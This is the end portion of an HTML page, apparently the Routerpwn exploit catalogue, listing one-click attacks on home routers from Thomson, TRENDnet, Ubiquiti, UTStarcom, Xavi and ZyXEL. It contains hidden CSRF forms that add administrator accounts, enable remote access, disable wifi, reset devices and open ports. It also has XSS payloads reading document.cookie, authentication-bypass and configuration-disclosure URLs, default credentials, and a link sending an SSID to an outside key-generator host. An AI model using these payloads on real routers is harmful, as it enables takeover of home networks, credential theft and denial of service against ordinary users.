	<div><a href="http://telmex:telmex@192.168.1.254/">5200 Default administrator account</a></div>
	<div><a href="javascript:ssDefaultPass()">[IP]</a></div>
</article>

<article>
	<div>06/16/08</div>
	<div><a href="http://hakim.ws/textos/ss5200-authbypass.txt">[+]</a></div>
	<div><a href="http://192.168.1.254./">5200 Host authentication bypass</a></div>
	<div><a href="javascript:setip('./')">[IP]</a></div>
</article>

<article>
	<div>06/16/08</div>
	<div><a href="http://hakim.ws/textos/ss5200-authbypass.txt">[+]</a></div>
	<div><a href="http://192.168.1.254./.cfg">5200 Configuration disclosure /.cfg</a></div>
	<div><a href="javascript:setip('./.cfg')">[IP]</a></div>
</article>

<article>
	<div>08/02/08</div>
	<div><a href="http://helith.net/txt/siemens_gigaset_se461_wimax_router_remote_dos.txt">[+]</a></div>
	<div><a href="http://192.168.1.1:53">SE461 denial of service</a></div>
	<div><a href="javascript:setip(':53')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="thomson">
<form name='thomsonadmin' action='http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9' method='post'>
<input type=hidden name='0' value='10'><input type=hidden name='1' value='usrAccApply'><input type=hidden name='34' value='NewUser'><input type=hidden name='36' value='1'><input type=hidden name='33' value='telmex'><input type=hidden name='31' value='Administrator'>
</form>
<form name='thomsoncall' action='http://bthomehub/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=' method='post'>
<input type=hidden name='0' value='30'><input type=hidden name='1' value=''></form>
<form name='thomsondos' action='http://192.168.1.254/cgi/b/info/reset/?be=0&l0=0&l1=1&tid=RESET' method='post'>
<input type=hidden name='0' value='18'><input type=hidden name='1' value=''></form>
<form action='http://192.168.1.254/cgi/b/sfltr/cfg/?be=0&l0=2&l1=5' method='post' name=thomsondom>
<input type=hidden name='0' value=19><input type=hidden name='1' value=''>
<input type=hidden name='30' value='1'><input type=hidden name='31' value='1'>
<input type=hidden name='32' id=dom1 value='origen'><input type=hidden name='33' value='2'>
<input type=hidden name='34' id=dom2 value='destino'></form>
<form name='btra' action='http://192.168.1.254/cgi/b/ras//?ce=1&be=1&l0=5&l1=5' method='post'><input type='hidden' name='0' value='31'><input type='hidden' name='1' value=''><input type='hidden' name='30' value='12345678'></form>
<form name='btwifi' action="http://192.168.1.254/cgi/b/_wli_/cfg//" method="post"><input type="hidden" name="0" value="10"><input type="hidden" name="1" value=""><input type="hidden" name="32" value=""><input type="hidden" name="33" value=""><input type="hidden" name="34" value="2"><input type="hidden" name="35" value="1"><input type="hidden" name="45" value="11"><input type="hidden" name="47" value="1"></form>
<h2>Thomson</h2>
<h3><a href="javascript:img('SpeedTouch ST585')">SpeedTouch ST585</a>, <a href="javascript:img('TG585n')">TG585n</a>, <a href="javascript:img('bthomehub')">7G (bthomehub)</a></h3>

<article>
	<div>02/01/12</div>
	<div><a href=http://www.hakim.ws/st585/KevinDevine>[+]</a></div>
	<div><a href="javascript:document.location='http://50.57.229.26/stkeys.php?ssid='+prompt('SSID:');">Thomson SpeedTouch STKeys Default Wireless Key Generator</a></div>
	<div></div>
</article>

<article>
	<div>04/02/11</div>
	<div><a href=alert("Edgard_Chammas")>[+]</a></div>
	<div><a href="http://192.168.1.254/cgi/b/ic/connect/?url=<script>alert(1)</script>">ST585 Cross site scripting</a></div>
	<div><a href="javascript:setip('/cgi/b/ic/connect/?url=<script>alert(1)</script>')">[IP]</a></div>
</article>

<article>
	<div>12/09/09</div>
	<div><a href="http://www.exploit-db.com/exploits/10362">[+]</a></div>
	<div><a href="http://192.168.1.254./cgi/b/backup/user.ini">ST585, TG585n user.ini arbitrary download vulnerability</a></div>
	<div><a href="javascript:setip('./cgi/b/backup/user.ini')">[IP]</a></div>
</article>

<article>
	<div>06/10/08</div>
	<div><a href="http://hakim.ws/textos/st585-csrf.txt">[+]</a></div>
	<div><a href="javascript:thomsondom()">ST585 Redirect domain CSRF</a></div>
	<div><a href="javascript:thomsondomr()">[IP]</a></div>
</article>

<article>
	<div>06/10/08</div>
	<div><a href="http://hakim.ws/textos/st585-csrf.txt">[+]</a></div>
	<div><a href="javascript:thomsonadmin()">ST585 Add administrator account CSRF</a></div>
	<div><a href="javascript:thomsonadminr()">[IP]</a></div>
</article>

<article>
	<div>02/14/08</div>
	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/">[+]</a></div>
	<div><a href="javascript:thomsoncall()">bthomehub call number (voice-jacking) auth bypass</a></div>
	<div><a href="javascript:thomsoncallr()">[IP]</a></div>
</article>

<article>
	<div>11/08/07</div>
	<div><a href="http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/">[+]</a></div>
	<div><a href="http://bthomehub/cgi/b/secpol/cfg//">bthomehub authentication bypass</a></div>
	<div><a href="javascript:setip('/cgi/b/secpol/cfg//')">[IP]</a></div>
</article>

<article>
	<div>11/08/07</div>
	<div><a href="http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/">[+]</a></div>
	<div><a href="javascript:btra()">bthomehub enable remote access and change tech password</a></div>
	<div><a href="javascript:btrar()">[IP]</a></div>
</article>

<article>
	<div>11/08/07</div>
	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-1/">[+]</a></div>
	<div><a href="javascript:document.btwifi.submit()">bthomehub disable wifi</a></div>
	<div><a href="javascript:btwifir()">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="trendnet">
<h2>TRENDnet</h2>
<h3><a href="javascript:img('TEW-633GR')">TEW-633GR</a>, <a href="javascript:img('Trendnet TV-IP')">TV-IP</a></h3>

<article>
	<div>01/10/12</div>
	<div><a href="http://console-cowboys.blogspot.com.au/2012/01/trendnet-cameras-i-always-feel-like.html">[+]</a></div>
	<div><a href="http://192.168.10.30/anony/mjpg.cgi">TV-IP Cameras authentication bypass</a></div>
	<div><a href="javascript:setip('/anony/mjpg.cgi')">[IP]</a></div>
</article>

<article>
	<div>02/26/08</div>
	<div><a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">[+]</a></div>
	<div><a href="http://192.168.10.1/Basic/Wireless.shtml">TEW-633GR A-to-C authentication bypass</a></div>
	<div><a href="javascript:setip('/Basic/Wireless.shtml')">[IP]</a></div>
</article>

<article>
	<div>02/26/08</div>
	<div><a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">[+]</a></div>
	<div><a href="http://192.168.10.1/reboot.cgi?reset=true">TEW-633GR unauthorized factory reset</a></div>
	<div><a href="javascript:setip('/reboot.cgi?reset=true')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="ubiquiti">
<h2>Ubiquiti</h2>
<h3><a href="javascript:img('AirOS')">AirOS v3.6.1, v4.0, v5.x</a></h3>

<article>
	<div>12/19/11</div>
	<div><a href="http://forum.ubnt.com/showthread.php?t=45169">[+]</a></div>
	<div><a href="http://192.168.1.1/admin.cgi/sd.css">AirOS v3.6.1 v4.0 v5.x command execution</a></div>
	<div><a href="javascript:setip('/admin.cgi/sd.css')">[IP]</a></div>
</article>

<article>
	<div>06/30/10</div>
	<div><a href="http://www.securityfocus.com/bid/41272/info">[+]</a></div>
	<div><a href="javascript:airoscmd()">AirOS command execution</a></div>
	<div><a href="javascript:airoscmdr()">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="utstarcom">
<h2>UTStarcom</h2>
<h3><a href="javascript:img('DNA-A-211')">DNA-A-211</a>, <a href="javascript:img('UT300R2U')">UT300R2U</a></h3>

<article>
	<div>09/03/08</div>
	<div><a href="http://www.indiabroadband.net/bsnl-broadband/9002-isp-login-failed.html">[+]</a></div>
	<div><a href="http://192.168.1.1/ppppassword.html">DNA-A-211, UT300R2U information disclosure</a></div>
	<div><a href="javascript:setip('/ppppassword.html')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="xavi">
<h2>Xavi</h2>
<h3><a href="http://www.xavi.com.tw/Product.aspx?PLT=ADSL&PCT=ADSL2%2b++++Wireless+CPE&PCV=4&M=X7968">X7968</a></h3>

<article>
	<div>01/02/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="http://192.168.1.1/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+">X7968 cross site scripting</a></div>
	<div><a href="javascript:setip('/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&confirm=+Apply+')">[IP]</a></div>
</article>

<article>
	<div>01/02/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="http://192.168.1.1/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply">X7968 persistent cross site scripting</a></div>
	<div><a href="javascript:setip('/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&sub_mask_txtbox=255.255.255.0&host_name_txtbox=Hack<SCRIPT>alert(document.cookie)</script>&domain_name_txtbox=local.lan&mtu_txtbox=1500&next=Apply')">[IP]</a></div>
</article>

<article>
	<div>01/02/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="javascript:xavi()">X7968 open port for ip CSRF</a></div>
	<div><a href="javascript:xavir()">[IP]</a></div>
</article>

<article>
	<div>01/02/12</div>
	<div><a href="javascript:alert('Busindre')">[+]</a></div>
	<div><a href="http://192.168.1.1/webconfig/ports/ports.html">X7968 denial of service</a></div>
	<div><a href="javascript:setip('/webconfig/ports/ports.html')">[IP]</a></div>
</article>

<div style="float: right"><a href="#">^ Top</a></div>
</section>

<section id="zyxel">
<form name="zyxelxss" mehod="post" action="http://192.168.1.1/forms/General_1"><input name="sysSystemname" type='hidden'><input name="sysDomainname" type='hidden'><input name="StdioTimout" value="0" type='hidden'><input name="sysSubmit" value="Apply" type='hidden'></form>
<form id="zyxelxssp" method="post" action="http://192.168.1.1/Forms/PortForwarding_Edit_1">
<input name="PortRule_Name" value='' type='hidden'><input name="PortRule_SPort" value="77" type='hidden'><input name="PortRule_EPort" value="77" type='hidden'><input name="PortRule_SrvAddr" value="10.0.0.1" type='hidden'>
<h2>ZyXEL</h2>
<h3><a href="javascript:img('ZyXEL Prestige')">ZyXEL Prestige</a>, <a href="javascript:img('G-570S')">G-570S</a>, <a href="javascript:img('P-660H-D1')">P-660H-D1</a>, <a href="javascript:img('P-660H-D3')">P-660H-D3</a>, <a href="javascript:img('P-660HW-D1')">P-660HW-D1</a>, <a href="javascript:img('Zywall2')">Zywall2</a>, <a href="javascript:img('ZyWall USG')">ZyWall USG</a>, <a href="javascript:img('O2 Classic')">O2 Classic</a></h3>

<article>
	<div>05/04/11</div>
	<div><a href="http://int21.de/cve/CVE-2011-0746-o2-router.html">[+]</a></div>
	<div><a href="javascript:zyxelxssp()">O2 Classic persistent cross site scripting</a></div>
	<div><a href="javascript:zyxelxsspr()">[IP]</a></div>
</article>

<article>
	<div>05/04/11</div>
	<div><a href="http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-004/-client-side-authorization-zyxel-zywall-usg-appliances-web-interface">[+]</a></div>
	<div><a href="https://192.168.0.1/cgi-bin/export-cgi?category=config&arg0=startup-config.conf">ZyWALL USG client side authorization config disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/export-cgi?category=config&arg0=startup-config.conf')">[IP]</a></div>
</article>

<article>
	<div>02/18/09</div>
	<div><a href="http://mfs-enterprise.com/security/site/en/advisory/Security_Advisory_ZyXEL.pdf">[+]</a></div>
	<div><a href="http://192.168.1.1/cgi-bin/ExportCurrentSettings?exportsetting=1">G-570S configuration disclosure</a></div>
	<div><a href="javascript:setip('/cgi-bin/ExportCurrentSettings?exportsetting=1')">[IP]</a></div>
</article>

<article>
	<div>03/03/08</div>
	<div><a href="http://www.gnucitizen.org/static/blog/2008/04/hacking_zyxel_gateways_part_2.pdf">[+]</a></div>
	<div><a href="http://192.168.1.1/BackupCfg.html">Prestige configuration disclosure</a></div>
	<div><a href="javascript:setip('/BackupCfg.html')">[IP]</a></div>
</article>

<article>
	<div>02/19/08</div>
	<div><a href="http://www.packetstormsecurity.org/papers/attack/Hacking_ZyXEL_Gateways.pdf">[+]</a></div>
	<div><a href="http://192.168.1.1/rpSysAdmin.html">Prestige privilege escalation</a></div>
	<div><a href="javascript:setip('/rpSysAdmin.html')">[IP]</a></div>
</article>

<article>
	<div>00/00/0?</div>
	<div></div>
	<div><a href="http://user:1234@192.168.1.1/">Prestige default password</a></div>
	<div><a href="javascript:zyxeldefault()">[IP]</a></div>
</article>
	
<article>
	<div>00/00/0?</div>
	<div><a href="http://everlost.nl/kender/zyxel/">[+]</a></div>
	<div><a href="http://192.168.1.1/rom-0">ZyNOS configuration disclosure</a></div>
	<div><a href="javascript:setip('/rom-0')">[IP]</a></div>
</article>

<article>
	<div>10/08/07</div>
	<div><a href="http://louhisecurity.fi//advisory/zyxel_070810.txt">[+]</a></div>
	<div><a href="javascript:zyxelxss()">Zywall2 Persistent Cross Site Scripting</a></div>
	<div><a href="javascript:zyxelxssr()">[IP]</a></div>
</article>

<article>
	<div>11/21/04</div>
	<div><a href="http://www.securityfocus.com/archive/1/381835/30/0/threaded">[+]</a></div>
	<div><a href="http://192.168.1.1/rpFWUpload.html">Prestige unauthorized reset</a></div>
	<div><a href="javascript:setip('/rpFWUpload.html')">[IP]</a></div>
</article>
<div style="float: right"><a href="#">^ Top</a></div>
</section>

</section>
		
</section>
	<footer>
		<a href="http://routerpwn.com/thanks.html">Routerpwn contributors</a><br/><br/>
		<a href="http://routerpwn.com/contact.html">submisions and contact form</a><br/><br/>
		<a href="#">^ Top</a>
	</footer>
	</body>
</html>
